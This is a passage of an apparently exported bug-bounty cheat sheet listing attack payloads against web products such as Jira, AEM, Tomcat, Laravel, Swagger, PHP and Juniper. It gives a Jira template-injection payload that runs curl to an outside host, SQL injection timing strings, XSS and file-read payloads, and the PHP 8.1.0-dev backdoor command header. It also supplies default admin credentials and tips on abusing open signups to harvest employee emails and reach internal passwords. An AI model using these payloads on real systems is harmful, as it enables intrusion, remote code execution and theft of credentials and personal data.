endpoint</summary><div class="indented"><ol type="1" id="e38ba961-4dad-4396-9de8-f41316ea164a" class="numbered-list" start="1" dir="auto"><li>/rest/api/latest/groupuserpicker?query=1&amp;maxResults=50000&amp;showAvatar=true</li></ol><ol type="1" id="1c59314e-a855-499d-a96d-9ed0442d637d" class="numbered-list" start="2" dir="auto"><li>/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml</li></ol><ol type="1" id="f2faac75-7ebb-4c17-a06f-7c0bcb4d35e7" class="numbered-list" start="3" dir="auto"><li>rest/api/2/user/picker?query=admin</li></ol></div></details><details id="c144dbbc-da77-4eb6-8454-5e9844d47378" open="" class="toggle" dir="auto"><summary>SSTI</summary><div class="indented"><p id="0e4ae7e0-b827-408f-95d6-9b5a9f12db80" class="" dir="auto">/secure/ContactAdministrators!default.jspa<br/>Try SSTI payload in subject and/or body:<br/>$i18n.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;,null).invoke(null,null).exec(&#x27;curl <a href="http://xyz.burp/">http://xyz.burp</a>(.)net&#x27;).waitFor()</p></div></details><details id="b34d68be-d5b3-44a1-ad8d-46fff2959b10" open="" class="toggle" dir="auto"><summary>CVE-2020-14179(Info disclosure):</summary><div class="indented"><p id="ba41c07a-3ac5-43ba-877c-2c4a14a440d3" class="" dir="auto">http://&lt;JIRA&gt;/secure/QueryComponent!Default.jspa</p></div></details><details id="093c1e08-1839-4db1-a6e1-1d9ffc473bfc" open="" class="toggle" dir="auto"><summary>CVE-2020-14178(Project Key Enum):</summary><div class="indented"><p id="a18ac533-f6cb-4214-9cda-64100c2b270c" class="" dir="auto">http://&lt;JIRA&gt;/browse.&lt;PROJECTKEY&gt;</p></div></details><details id="e5b8af12-fda1-495d-80b4-3324127230ea" open="" class="toggle" dir="auto"><summary>CVE-2020-14181(User enum):</summary><div class="indented"><p id="8fe4b09b-a542-479f-be06-5b125c677ff4" class="" dir="auto">http://&lt;JIRA&gt;/secure/ViewUserHover.jspa?username=Admin</p></div></details><details id="52e0c917-f064-4360-a324-827efbb465e8" open="" class="toggle" dir="auto"><summary>CVE-2020-36289(Username Enumeration) : </summary><div class="indented"><p id="bbe4d4fd-2254-4ad3-8bb6-d7e99cacf266" class="" dir="auto">https://&lt;JIRA&gt;/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin</p></div></details><details id="9e5243e2-4d45-44b1-ba78-d370165446d5" open="" class="toggle" dir="auto"><summary>Jira-unauth-popular-filters:</summary><div class="indented"><p id="30197481-55a6-46d9-a658-e7532fab9009" class="" dir="auto">https://&lt;JIRA&gt;/secure/ManageFilters.jspa?filterView=popular</p><p id="c45d06b5-b030-43c4-800e-010fa5623e07" class="" dir="auto">/ConfigurePortalPages!default.jspa?view=popular</p></div></details><details id="c2c7e422-80ab-482e-b0fc-86f22ecc2baf" open="" class="toggle" dir="auto"><summary>Jira-unauthenticated-dashboards:</summary><div class="indented"><p id="b6d657f5-7586-47fa-b5e7-a1cbd633e70e" class="" dir="auto">https://&lt;JIRA&gt;/rest/api/2/dashboard?maxResults=100</p></div></details><details id="6372ba02-c4ee-49f6-af10-5a1155d818a0" open="" class="toggle" dir="auto"><summary>Getting employees email</summary><div class="indented"><p id="3889b675-54ca-41cd-a232-c32a24e26d42" class="" dir="auto">If you want to get a list of all employees (emails, names) that belongs to your target company!<br/>Try to find Jira Servicedesk, sometimes there is a misconfiguration that allows you to signup using your personal email! and get access to internal dashboards</p><p id="9638f32b-fb80-4d0e-864b-2345322a106f" class="" dir="auto">Assume that you target company is REDACTED, go to</p><p id="2011487d-4331-4bdb-9a3b-ad8f838f12f2" class="" dir="auto"><a href="https://t.co/xtZR8jJnjZ">https://redacted.atlassian.net/servicedesk/</a></p><p id="aaa0d1e5-5a59-4cbf-911a-f2bd40be13bb" class="" dir="auto">and sometimes you&#x27;ll find the signup button available.<br/>Create your account and then access it using your pass</p><p id="2e76e943-aab2-4726-b6f4-f32dd6d038e0" class="" dir="auto">Go to some portals inside the dashboard and try to find where you can search for internal employees (see the picture below where i was able to select the manager name, email by just changing the first letter in the search box)</p></div></details></div></details><details id="64afcf31-31d2-426c-ba1f-0d547900a8eb" open="" class="toggle" dir="auto"><summary><a href="http://Atlassian.net">Atlassian.net</a> targets endpoint to check</summary><div class="indented"><ol type="1" id="adac8d28-afde-4f47-83f4-7ed2e8cd9cf8" class="numbered-list" start="1" dir="auto"><li>For target.atlassian(.)net, check this endpoints:<br/>/servicedesk/customer/user/signup [Able to login? Vuln:)]<br/>/jira/projects [Can see projects? Vuln:) Now click on sign in and use OAuth]</li></ol></div></details><details id="d22310f8-21fe-4244-b05b-458f1a1b81a5" open="" class="toggle" dir="auto"><summary>Hidden signup endpoints of different services</summary><div class="indented"><ol type="1" id="cc7f27f8-c58f-42aa-bfae-cfc156984ece" class="numbered-list" start="1" dir="auto"><li>laravel : /register</li></ol><ol type="1" id="39985c3c-7620-4675-b0af-e44e214c7af2" class="numbered-list" start="2" dir="auto"><li>drupal: /user/register</li></ol><ol type="1" id="fca9e8b8-1497-4240-93c8-c347f0d5fdb8" class="numbered-list" start="3" dir="auto"><li>wordpress: /wp-login.php?action=register</li></ol><ol type="1" id="ab878ef5-1c64-46f8-96a0-9e744bd0e0b3" class="numbered-list" start="4" dir="auto"><li>ezpublish: /register</li></ol></div></details><details id="854b006d-a9fa-491a-be0b-90ac691de5d4" open="" class="toggle" dir="auto"><summary>Spring boot actuator </summary><div class="indented"><p id="d5a7525d-2029-42bc-b5de-0b67689a3da8" class="" dir="auto">&quot;application/vnd.spring-boot.actuator.v3+json&quot;<br/><br/>end points :<br/>actuator/beans<br/>actuator/info<br/>actuator/caches<br/>actuator/env</p></div></details><details id="fc37bc1e-60ee-4d5b-8e5b-4b2dcd8334c8" open="" class="toggle" dir="auto"><summary>Spring boot apps</summary><div class="indented"><p id="1b77cdea-4de8-47c7-8cd0-cf26795b1201" class="" dir="auto">If you see this error :</p><figure id="4f18ed2f-fc61-4812-a2dd-22ffc1358e35" dir="ltr"><div class="source"><a href="https://pbs.twimg.com/media/GJGBQrVXUAA8syi?format=png&amp;name=900x900">https://pbs.twimg.com/media/GJGBQrVXUAA8syi?format=png&amp;name=900x900</a></div></figure><p id="f8af53c9-dd60-43c7-950f-67858e436fc2" class="" dir="auto">Then try : </p><ol type="1" id="290d1c74-0c95-43f6-9c15-32e537c6346d" class="numbered-list" start="1" dir="auto"><li>actuator/logfile </li></ol><ol type="1" id="79c224af-c855-42d0-9dba-7ebe1b129933" class="numbered-list" start="2" dir="auto"><li>And do try this steps : <a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></li></ol><p id="2daac68a-fbe5-4605-8d3f-e0d2f7877cbd" class="" dir="auto">Reference : <a href="https://twitter.com/bogdantcaciuc7/status/1770338438648094895">https://twitter.com/bogdantcaciuc7/status/1770338438648094895</a></p></div></details><details id="611de664-39f1-4199-8fe3-0ddbe0a0ad8c" open="" class="toggle" dir="auto"><summary><a href="http://ASP.NET">ASP.NET</a> server web-apps tip</summary><div class="indented"><details id="c3fd8cc5-d7a6-42e5-bdce-b6a55700521e" open="" class="toggle" dir="auto"><summary>Tip1 </summary><div class="indented"><p id="bd7139c2-d409-4a2c-8198-6b55f7ac1ad3" class="" dir="auto">whenever you see : )<br/>Server: Microsoft-IIS/6.X<br/>X-Powered-By: <a href="https://t.co/e3SGShDl80">ASP.NET</a></p><p id="5e49afc8-5b00-42f5-a45a-a402080de4b7" class="" dir="auto">Always try this ..... <br/>/admin/help.cgi<br/>/admin/help.cgi.bak<br/>/admin/WS_FTP.LOG<br/>/adovbs.inc<br/>/confirm.asp.bak <br/>/default.asp.bak<br/>/login.asp.bak</p><p id="c60a7215-3e2a-4166-a946-467f57e6f247" class="" dir="auto">/pindex.asp.bak<br/>/rootlogin.asp.bak<br/>/rootlogin.asp.old<br/>/_vti_pvt/service.cnf<br/>/include/common.inc<br/>/WS_FTP.LOG</p><details id="6165b996-0b9e-4c7c-8383-45b208c26790" open="" class="toggle" dir="auto"><summary>Outcomes</summary><div class="indented"><ol type="1" id="d4be431f-c52f-4729-883f-a5e2e1fee650" class="numbered-list" start="1" dir="auto"><li>A serious WS_FTP vulnerability was identified within your web application. WS_FTP is a popular FTP client for Windows which is utilized by system administrators and developers to upload and download files from web servers, with each transfer notated in a log file by default.</li></ol><ol type="1" id="2dca0fc1-c074-4dcb-b75d-77a5d1850cda" class="numbered-list" start="2" dir="auto"><li>The service.cnf file was found in the _vti_pvt directory on a system running Microsoft FrontPage Server Extensions. An attacker could submit a request for the vulnerable file and cause the server to reveal sensitive system information.</li></ol></div></details></div></details><details id="85a7f664-5c68-481c-9005-60512fa0b690" open="" class="toggle" dir="auto"><summary>Tip 2</summary><div class="indented"><p id="7eaba2d7-b0b0-46c1-84af-7d0cb9f68719" class="" dir="auto">Tricky ASP blind SQL Injection in a login page in <code>logon</code> param. Confirmed using Blind-boolean method,but it took me hours before I found the right payload - that need to be encoded. Sadly, not triaged yet</p><p id="0f52f14c-d5df-4c3b-bc90-e08a5561a1b3" class="" dir="auto">Payload: <code>&#x27;;%20waitfor%20delay%20&#x27;0:0:6&#x27;%20--%20</code></p></div></details><details id="7ff3808b-4274-45e9-94f1-d5e38455a4e1" open="" class="toggle" dir="auto"><summary>Tip 3</summary><div class="indented"><p id="15deeefb-7155-47f6-8f66-c07add95416f" class="" dir="auto">1. Found subdomain(404 asp[.]net) via recon and start fuzzing dir (aspx&amp;asp) extention.<br/>2. Discovered reset.aspx page (have input username) &amp; paste payload (&#x27;;waitfor delay &#x27;0:0:10&#x27;--) and delay worked ;D</p></div></details><details id="327a6ff2-fe7a-4bbc-8e39-a47a2d37c38e" open="" class="toggle" dir="auto"><summary>Tip 4 </summary><div class="indented"><ol type="1" id="81a77a18-d53f-4a06-9518-778e74d8472e" class="numbered-list" start="1" dir="auto"><li>Dnsbrute and grep some subdomains</li></ol><ol type="1" id="c550d1b9-1b91-4a78-8da6-8204c4b2cea2" class="numbered-list" start="2" dir="auto"><li>Start directory fuzzing with .aspx extention</li></ol><ol type="1" id="f853ed1a-016f-4119-b7c3-01a024c7b6e4" class="numbered-list" start="3" dir="auto"><li>Discovered Passwordresx.aspx and paste payload (&#x27; waitfor delay&#x27;0:0:20&#x27;--)</li></ol></div></details><details id="aacb7875-22fe-4619-a605-e34b523c473b" open="" class="toggle" dir="auto"><summary>Tip 5</summary><div class="indented"><p id="dabce383-1c86-465f-8684-507e24cea815" class="" dir="auto">Always check <code>viewstate</code> In Asp. Net</p><ul id="940a4ef9-a136-42f1-8a7d-51a44bce5641" class="bulleted-list" dir="auto"><li style="list-style-type:disc"><a href="https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net">https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net</a></li></ul></div></details></div></details><details id="9a60a15b-21cf-44fd-8603-54ad0d870d30" open="" class="toggle" dir="auto"><summary>Firebase Databases misconfig</summary><div class="indented"><ul id="25c28196-cb66-4d2e-bdc3-fa46cc13f81e" class="bulleted-list" dir="auto"><li style="list-style-type:disc"><a href="https://ghostlulz.com/google-exposed-firebase-database/">https://ghostlulz.com/google-exposed-firebase-database/</a></li></ul><ul id="5457c3e5-cde8-4c57-b4eb-775d7c4fe22d" class="bulleted-list" dir="auto"><li style="list-style-type:disc"><a href="https://twitter.com/_justYnot/status/1438355065518002180?s=20&amp;t=aVdmeG-2AI_vi_Gow2DP4w">https://twitter.com/_justYnot/status/1438355065518002180?s=20&amp;t=aVdmeG-2AI_vi_Gow2DP4w</a></li></ul></div></details><details id="349d6ef5-58de-4a77-84d0-6890c70afe72" open="" class="toggle" dir="auto"><summary>Php myadmin</summary><div class="indented"><ol type="1" id="5d376902-d1f1-46b5-a27f-f22b491151ec" class="numbered-list" start="1" dir="auto"><li><a href="https://twitter.com/tamimhasan404/status/1522814723271512065?s=20&amp;t=gncOEVMInXljTB0nVKjFQA">https://twitter.com/tamimhasan404/status/1522814723271512065?s=20&amp;t=gncOEVMInXljTB0nVKjFQA</a></li></ol><ol type="1" id="0784008e-646c-432c-b61f-ba854f508ba4" class="numbered-list" start="2" dir="auto"><li><a href="https://twitter.com/therceman/status/1551620350999494657?s=20&amp;t=oky5cuE9-2Q2tjsMh0eTcQ">https://twitter.com/therceman/status/1551620350999494657?s=20&amp;t=oky5cuE9-2Q2tjsMh0eTcQ</a></li></ol><ol type="1" id="7e8367d4-eff0-466c-8d07-e5dec5392c21" class="numbered-list" start="3" dir="auto"><li><a href="https://twitter.com/cycatz2/status/1476518831702953985?s=20&amp;t=oky5cuE9-2Q2tjsMh0eTcQ">https://twitter.com/cycatz2/status/1476518831702953985?s=20&amp;t=oky5cuE9-2Q2tjsMh0eTcQ</a></li></ol><ol type="1" id="3b1b7de7-75c7-4b00-a924-389a5bd0aa41" class="numbered-list" start="4" dir="auto"><li><a href="https://twitter.com/naglinagli/status/1374332024920608774?s=20&amp;t=gKaH2wX89dkXxLpTSP9mAQ">https://twitter.com/naglinagli/status/1374332024920608774?s=20&amp;t=gKaH2wX89dkXxLpTSP9mAQ</a></li></ol><ol type="1" id="3d5a03bd-8550-4761-b298-22c6dbf78119" class="numbered-list" start="5" dir="auto"><li>/phpmyadmin/scripts/setup.php</li></ol><ol type="1" id="c748373d-7777-441d-8aec-f855d5ebe9ed" class="numbered-list" start="6" dir="auto"><li>setup/index.php?page=servers&amp;mode=test&amp;id=test</li></ol></div></details><details id="8c623604-845f-4bc6-a3f2-92b2f6a00e8f" open="" class="toggle" dir="auto"><summary>OKTA</summary><div class="indented"><details id="bfcfd14f-1121-4be4-ba26-5ad5a3389b77" open="" class="toggle" dir="auto"><summary>Tip 1</summary><div class="indented"><p id="4c1709ff-3d47-49e9-95a3-ad3d751f99ae" class="" dir="auto">Whenever you end up on Okta login, click on &quot;Need help signing in&quot; just to see if there is any link to their internal wiki or helpdesk. I ended up on an IT helpdesk which had &quot;Sign Up&quot; enabled and got access to internal docs, passwords &amp; what not</p></div></details></div></details><details id="89bff425-0187-4f03-a5e5-b874dcddc92f" open="" class="toggle" dir="auto"><summary>Apache Tomcat</summary><div class="indented"><ol type="1" id="5fc2c155-1fa1-4e2e-8a9b-67acc8d4a8e8" class="numbered-list" start="1" dir="auto"><li>/webapp/admin/login.html?1%001337&#x27;%3balert(&#x27;akr3ch&#x27;)%2f%2f</li></ol><ol type="1" id="ea107790-05bc-49a1-9cba-b68d7b48a595" class="numbered-list" start="2" dir="auto"><li>They are vulnerable to xss target/examples/jsp/cal/cal2.jsp?time=8am%20STYLE=xss:e/**/xpression(try{a=firstTime}catch(e){firstTime=1;alert(&#x27;XSS&#x27;)});</li></ol><ol type="1" id="896f1420-d4eb-4998-8f16-47a7dbc68eef" class="numbered-list" start="3" dir="auto"><li>1. fuzz website<br/>2- found this path /jk_status?cmd=dump = dump data<br/>3- search more about this misconfigure<br/>4- found /jk_status?opt=0 = read and write privilege</li></ol><ol type="1" id="b0a2552f-c360-41d0-8238-c2c8f5f24406" class="numbered-list" start="4" dir="auto"><li>CVE-2019-10092 Apache HTTP Server &lt;=2.4.39 - HTML Injection/Partial Cross-Site Scripting</li></ol><p id="e1effd86-1d28-454e-9bfa-77efc31ad0bc" class="" dir="auto">       Payload: <a href="https://target/">https://target</a>[.]com/%5cevil[.]com/evil.html</p></div></details><details id="0641bac8-f64d-406d-a963-0a84d1140678" open="" class="toggle" dir="auto"><summary>Matomo</summary><div class="indented"><p id="34c54037-55c4-490d-b11a-a102b9dd6d97" class="" dir="auto">/matomo/.travis.yml</p></div></details><details id="d23e8004-0278-468d-a285-8dc5cf34b80c" open="" class="toggle" dir="auto"><summary>Wordpress</summary><div class="indented"><p id="81b11e50-5182-4f79-b2be-488f88d1ce3e" class="" dir="auto">Tip: Always check for Directory Listing on wordpress wp-content/uploads/ folder, 90% it contains sensitive information.</p><ol type="1" id="80f337b4-fc15-4fde-b3c4-732a654a490c" class="numbered-list" start="2" dir="auto"><li>Check for ?action=register in wp-admin</li></ol></div></details><details id="6d3dc8bc-a146-4a84-b435-79096ec9f587" open="" class="toggle" dir="auto"><summary>Laravel Framework</summary><div class="indented"><ol type="1" id="7e00af91-b2c8-4f59-becf-b4a5265e45e6" class="numbered-list" start="1" dir="auto"><li>LFI :  //////////////////../../../../../../../../etc/passwd</li></ol><ol type="1" id="f25cecb2-c80c-477a-b584-c9dc51f2d1fb" class="numbered-list" start="2" dir="auto"><li>If you encounter in a Website running on Laravel don&#x27;t forget to check /_debugbar which is Debug Mode Enabled for Laravel and you might end up finding Sensitive Data Like DB Creds and other stuff.</li></ol><ol type="1" id="403dc39c-2322-80ea-b5bf-e04b8211e792" class="numbered-list" start="3" dir="auto"><li>While testing a Laravel site try injecting different kinds of payloads or change Request methods to GET&gt;POST or POST&gt;GET. this will result in Laravel exception handler error Disclosing AWS, Database, and SMTP Credentials.</li></ol></div></details><details id="597b93a0-7da1-4de6-a4f2-f7665224b5fd" open="" class="toggle" dir="auto"><summary>Symfony</summary><div class="indented"><ol type="1" id="4ba7ecc9-3cc6-4fe6-87c6-3f1312ba0d41" class="numbered-list" start="1" dir="auto"><li>If you find Web frameworks: Symfony in wappalayzer<br/>once try subdomain[.]target[.]com/app_dev.php/_profiler/open?file=app/config/parameters.yml  &gt;&gt; Leaks database Credentials and some Sensitive Data.</li></ol><ol type="1" id="418548ef-ed41-4463-aecf-f0033cb24017" class="numbered-list" start="2" dir="auto"><li>If you happen to find Symfony Web Framework that has Symfony profiler debug mode enabled, fuzz the following endpoints:<ul id="7cd21cf3-1a4b-4d55-a52f-c32231ee8268" class="bulleted-list" dir="auto"><li style="list-style-type:disc">/app_dev.php</li></ul><ul id="af2ad3dd-6f88-4cf3-8ff9-eaa8ca93775d" class="bulleted-list" dir="auto"><li style="list-style-type:disc">/app_dev.php/_profiler/phpinfo</li></ul><ul id="db0c43ab-27be-4af6-9690-e70aa90fb347" class="bulleted-list" dir="auto"><li style="list-style-type:disc">/app_dev.php/_profiler</li></ul><ul id="7bb37a50-740f-49a0-8a00-dc15ed8c0f30" class="bulleted-list" dir="auto"><li style="list-style-type:disc">Look for &quot;profiler token&quot; in phpinfo()</li></ul></li></ol><ol type="1" id="25574b6a-91b6-4ea4-a672-82b26ac33d76" class="numbered-list" start="3" dir="auto"><li>Also, always  check Symfony targets for these directories: /_profiler.<br/>You might find  phpinfo containing Symfony secrets, which can lead to RCE.</li></ol></div></details><details id="ad4d862d-b6d8-4272-a334-f8e15cb0b2dd" open="" class="toggle" dir="auto"><summary>AEM</summary><div class="indented"><details id="d6d936db-9731-4c8f-b9d2-01fe3ddac532" open="" class="toggle" dir="auto"><summary>Tip 1 :</summary><div class="indented"><p id="ad5c06b7-1256-4d80-816a-6b26a04c18b4" class="" dir="auto">AEM default credentials allows me to get admin access to AEM login with all functions allowed and all PII for users on AEM<br/><br/>1. Navigate to</p><p id="403d4a0e-b369-4026-a921-5dcdd65371fe" class="" dir="auto"><a href="https://t.co/rEsiGianaS">http://dev.x.y.com/libs/granite/core/content/login.html…</a></p><p id="01926af2-e8b0-4227-a511-8ce26c6383ac" class="" dir="auto">2.Login using the below credentials<br/><br/>Username: admin , password: author or<br/><br/>Username: author , password: author<br/><br/>3. Now I logged In to panel and have the admin permission so I able to add, delete, modify anything on the AEM panel</p></div></details><details id="cd417726-62a7-4e51-8779-baf91a7e5d0b" open="" class="toggle" dir="auto"><summary>Tip 2</summary><div class="indented"><p id="f541803c-bc32-4828-9444-ea85e6c3c9de" class="" dir="auto">[+] Another awesome Adobe AEM Dispatcher filter bypass technique? oh okay<br/><br/>Hunting for JSON GET Servlet on /content.1.json however result = 404?<br/><br/>Try this:<br/><br/>/conten/.1.json <br/>/conten/t.1.json<br/>/content.tidy.1.json<br/>/conten/.tidy.infinity.json</p><p id="b884fb7f-2b8d-4817-ba92-a2f54e77985f" class="" dir="auto">/conten.json</p><p id="4a675d4a-ec5c-4248-93ef-e8d538abdc03" class="" dir="auto">
+</p><details id="daee4364-3e63-42b1-b450-2332dee09f5e" open="" class="toggle" dir="auto"><summary>XSS &amp; HTMLi</summary><div class="indented"><p id="d10d9212-2694-4379-9b1f-3f9e1d16d6ff" class="" dir="auto">I&#x27;ve had HTML injection using the childrenlist selector, e.g:<br/>/content/&lt;h1&gt;test&lt;/h1&gt;.childrenlist.json<br/>and with html as ext:<br/>content/&lt;h1&gt;test&lt;/h1&gt;.childrenlist.html</p></div></details></div></details><details id="966c9570-241a-480a-8c33-1818148a2dd9" open="" class="toggle" dir="auto"><summary>Tip 3</summary><div class="indented"><p id="1bd85fe6-3dcd-4f2d-bfa3-85679033d435" class="" dir="auto">If your application uses Adobe Experience Manager, then use the dorks to find PII disclosure.</p><p id="c5fefded-e9d0-46fc-b0d8-1b4e3a35221b" class="" dir="auto">Don&#x27;t forget the dork:-<br/>inurl:/content/dam/ ext:xls</p></div></details><details id="5ca3b031-18a1-462e-b685-5834306d20d8" open="" class="toggle" dir="auto"><summary>tip 4</summary><div class="indented"><p id="467cef27-5ee3-4aeb-be61-27ad21661063" class="" dir="auto"><a href="https://evil/">https://evil</a>[.]com/IM49%3Cimg%20src=x%20data%27a%27onerror=alert%28domain%29%3E.childrenlist.html</p></div></details><details id="13018540-5569-43b4-88bd-e01ab54c04f1" open="" class="toggle" dir="auto"><summary>tip 5 </summary><div class="indented"><p id="ec3e2c35-b77d-4826-97b5-f1835ab28519" class="" dir="auto">target[.]com/etc/groovyconsole.html<br/>and use the payload in the pic</p><p id="2bf044d3-833f-4308-bc56-1dd852e4c70e" class="" dir="auto"><br/>If you lucky enough you can have nice RCE ;)</p><figure id="b61256cd-210d-4b08-a870-3770e71c66fc" class="image" data-notion-image="Untitled.png" dir="ltr"><a href="Untitled.png"><img style="width:653.9866943359375px" src="Untitled.png"/></a></figure></div></details><details id="05e20435-9c23-46a8-b6f6-455bae13fe17" open="" class="toggle" dir="auto"><summary>tip 6</summary><div class="indented"><p id="29c687a0-d544-477b-a8ac-3a49c43ee9f5" class="" dir="auto">you can go to <br/>target[.]com/libs/granite/core/content/login.html<br/>in try one of this AEM default credentials</p><p id="ea74bf1b-b383-4454-87c7-882c8a874239" class="" dir="auto"><a href="https://t.co/r2lVTvEJe8">https://open-sez.me/passwd-adobe.htm…</a></p><figure id="30d33392-935e-43ea-8191-91a82492fb0b" class="image" data-notion-image="Untitled%201.png" dir="ltr"><a href="Untitled%201.png"><img style="width:1882px" src="Untitled%201.png"/></a></figure><p id="a465c16f-7da3-41d3-b0d1-58c6cdbcf22c" class="" dir="auto">in my case it was anonymous:anonymous</p></div></details><details id="98428a42-37b0-4111-bbcd-9517ab66dd8c" open="" class="toggle" dir="auto"><summary>Cache Poisoning</summary><div class="indented"><figure id="aac2ca36-b81a-4a19-b979-c72c552a8df7" class="image" data-notion-image="Untitled%202.png" dir="ltr"><a href="Untitled%202.png"><img style="width:900px" src="Untitled%202.png"/></a></figure></div></details></div></details><details id="d0d34ff2-ade1-4aef-a4b1-a7d675a63022" open="" class="toggle" dir="auto"><summary>Zendesk </summary><div class="indented"><details id="bf1e80fe-d105-445a-97a6-5ae136af37a2" open="" class="toggle" dir="auto"><summary>Wordlist to fuzz</summary><div class="indented"><p id="119a9811-8eb6-425b-a441-3f2a69807c5c" class="" dir="auto"><a href="https://t.co/mUsjFRX8Xu">https://t.co/mUsjFRX8Xu</a></p></div></details></div></details><details id="3de0e5ae-b620-427a-b25b-6297bfec51c7" open="" class="toggle" dir="auto"><summary>Cloudfusion</summary><div class="indented"><details id="91c48a69-e16a-48e3-8752-db9e6e076cd7" open="" class="toggle" dir="auto"><summary>XSS </summary><div class="indented"><p id="884d0035-95c7-453a-b9ad-ef20a6daeac6" class="" dir="auto">{{host}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(document.domain)</p></div></details></div></details><details id="1882e04f-6071-47b4-951c-83b89b3da1e4" open="" class="toggle" dir="auto"><summary>IIS</summary><div class="indented"><p id="49f83c48-6639-4ef1-9ee6-796a80cb6ae2" class="" dir="auto"><a href="https://x.com/ctbbpodcast/status/1688607912434819073?s=20">https://x.com/ctbbpodcast/status/1688607912434819073?s=20</a></p><p id="4651bca5-0be3-4306-ad47-6e36487798ef" class="" dir="auto"><a href="https://x.com/TodayCyberNews/status/1699142226960654409?s=20">https://x.com/TodayCyberNews/status/1699142226960654409?s=20</a></p><details id="404dc39c-2322-80c7-b1c5-c18249515335" open="" class="toggle" dir="auto"><summary>Tip</summary><div class="indented"><p id="404dc39c-2322-8088-a63d-cb0ec7e3660c" class="" dir="auto">If you encounter the default IIS Windows window, do not forget to add /haproxy and /netdata to your wordlist and scan them, if you gain unauthorized access here, you will earn a reward </p></div></details></div></details><details id="93d85dd5-d018-4602-a425-297ab07e85ba" open="" class="toggle" dir="auto"><summary>JFrog</summary><div class="indented"><ol type="1" id="4f4bb36b-51f4-46ee-892e-95309070058c" class="numbered-list" start="1" dir="auto"><li>Sometimes jfrog instances are unprotected you can try on your targets like <a href="https://t.co/xUYdv1ESf5">http://target.jfrog.io</a></li></ol><ol type="1" id="8a481613-7c48-4c76-b819-de4646133c02" class="numbered-list" start="2" dir="auto"><li>you found Jfrog URL<br/>and you get 403 / 401 ?<br/>try to add  <code>/ui/repos/tree/General </code>maybe you get lucky and found nuget / other compile customer source code :)</li></ol></div></details><details id="3f8633f5-3801-41b7-92d0-8939421de5e4" open="" class="toggle" dir="auto"><summary>Swagger</summary><div class="indented"><details id="35eccd4d-02aa-4c36-a81b-2d574f7a2231" open="" class="toggle" dir="auto"><summary>Tip <code>XSS</code></summary><div class="indented"><p id="3548a0b8-d0f5-41fd-a936-3d39026f6339" class="" dir="auto">Whenever I see a Swagger UI, I check its version. And, I try out these payloads:<br/><br/>?configUrl=<a href="https://t.co/PmICeTyNJf">https://jumpy-floor.surge.sh/test.json</a></p><p id="bc6a01ff-3292-49e0-94f3-a040c42a417e" class="" dir="auto">?url=<a href="https://t.co/yDy1GxroW8">https://jumpy-floor.surge.sh/test.yaml</a></p><p id="5cce7dc3-fbcb-4cec-8475-183d4d00b6d5" class="" dir="auto">?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==</p></div></details></div></details><details id="118fd580-a562-47fc-862e-c372926b2a64" open="" class="toggle" dir="auto"><summary>PHP 8.1.0-dev</summary><div class="indented"><p id="efa5a617-52c8-49ac-9157-110bdd98f66a" class="" dir="auto">If you find PHP 8.1.0-dev then try RCE &amp; SQLi<br/>User-Agentt: zerodiumsleep(5);<br/>User-Agentt: zerodiumsystem(&#x27;id&#x27;);</p></div></details><details id="035357cc-fbd3-4e81-aa45-bf16f8a76330" open="" class="toggle" dir="auto"><summary>Oracle E-Business</summary><div class="indented"><details id="f5557d22-6922-4035-98fc-815fed4d523a" open="" class="toggle" dir="auto"><summary>Registeration endpoint</summary><div class="indented"><p id="62b69b60-0e18-4adb-be15-0e0146bf3cd1" class="" dir="auto">/OA_HTML/ibeCAcpSSOReg.jsp </p><p id="c9a24a5a-c5bb-4e69-9a00-780af2bf9ccc" class="" dir="auto">/OA_HTML/ibeCRgpIndividualUser.jsp </p><p id="0a669d09-6908-4ab4-b526-d8b7ba63a817" class="" dir="auto">/OA_HTML/ibeCRgpPrimaryCreate.jsp </p><p id="04ab255b-419a-43cf-97df-32fc4fa80d72" class="" dir="auto">/OA_HTML/ibeCRgpPartnerPriCreate.jsp</p></div></details></div></details><details id="88c43ce8-b13c-442c-a264-a353e29efb96" open="" class="toggle" dir="auto"><summary>cake-php 2.2</summary><div class="indented"><p id="b31275e7-87b7-4bb1-a8c2-5e654c65f6a3" class="" dir="auto"><a href="https://cakephp/">https://cakephp</a>[.]com/pages/account/%22%3E%3Cimage%20src=x%20onerror=alert(0)%3E</p></div></details><details id="67727283-c64d-47d1-814b-99ca44f30cb4" open="" class="toggle" dir="auto"><summary>Apolo server</summary><div class="indented"><p id="46719bb7-fda1-49af-a45c-43f6afb59103" class="" dir="auto">if you found apollo-server exposed on /api/graphql , you can manipulate the embedded page via endpoint URL parm , and inject your own host to receive the graphql query (steal users&#x27; information ..etc )</p></div></details><details id="421e84d2-ffa2-4b37-835a-515a1fca1f36" open="" class="toggle" dir="auto"><summary>Juniper</summary><div class="indented"><p id="b6f2cd8c-2e39-4b2c-b5fe-eacff6816cac" class="" dir="auto">Juniper Web Device Manager RCE</p><p id="540d287e-de07-4365-802b-41bfe735c4b9" class="" dir="auto">POST /?PHPRC=/dev/fd/0 HTTP/1.1<br/>Host: {{Hostname}}</p><p id="c0316cba-24b0-4615-b6a0-43dedf6fbf6d" class="" dir="auto">auto_prepend_file=&quot;/etc/passwd&quot;</p></div></details><details id="29f7a8d8-6bbc-4595-a948-9131e3af642f" open="" class="toggle" dir="auto"><summary>jolokia</summary><div class="indented"><ol type="1" id="4d30885c-9e3a-4509-9a80-23e5c0ee65e1" class="numbered-list" start="1" dir="auto"><li>If you found /actuator/jolokia/ endpoint in your target you can escalate it to LFI     POC:<a href="https://target/">https://target</a>[.]com/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd</li></ol><ol type="1" id="eddcd092-6169-45f4-bc46-975202eb7e8b" class="numbered-list" start="2" dir="auto"><li>XSS /jolokia/read&lt;svg onload=alert(document.cookie)&gt;?</li></ol></div></details><details id="12042843-02b6-463c-b220-192acf97fe78" open="" class="toggle" dir="auto"><summary>camunda</summary><div class="indented"><p 